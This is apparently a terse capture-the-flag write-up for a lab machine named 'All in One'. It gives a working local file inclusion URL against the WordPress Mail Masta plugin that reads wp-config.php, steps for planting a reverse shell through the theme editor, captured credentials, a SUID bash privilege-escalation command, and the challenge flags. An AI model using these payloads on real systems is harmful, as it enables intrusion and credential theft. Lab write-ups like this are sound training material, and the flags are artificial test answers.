# All in One-Edit php file as admin&SUID chmod

```
export IP=10.10.153.220
```

# Material needed

1. Interesting directory: /wordpress

2. Wordpress exploitation

```
WordPress Plugin Mail Masta 1.0 - Local File Inclusion

# Get DBS credential 
http://$IP/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=../../../../../wp-config.php

# Edit 404.php with admin panel 
http://$IP/wordpress/wp-admin/theme-editor.php?file=404.php&theme=twentytwenty

# Run reverse shell
http://10.10.244.196/wordpress/wp-content/themes/twentytwenty/404.php
```

3. dbs credentials

```
elyana:H@ckme@123
```

4. Privilege escalation

```
LFILE=/bin/bash
/bin/chmod 6777 $LFILE
/bin/bash -p
```
# Tasks

1. user.txt

```
THM{49jg666alb5e76shrusn49jg666alb5e76shrusn}  
```

2. root.txt

```
THM{uem2wigbuem2wigb68sn2j1ospi868sn2j1ospi8}  
```
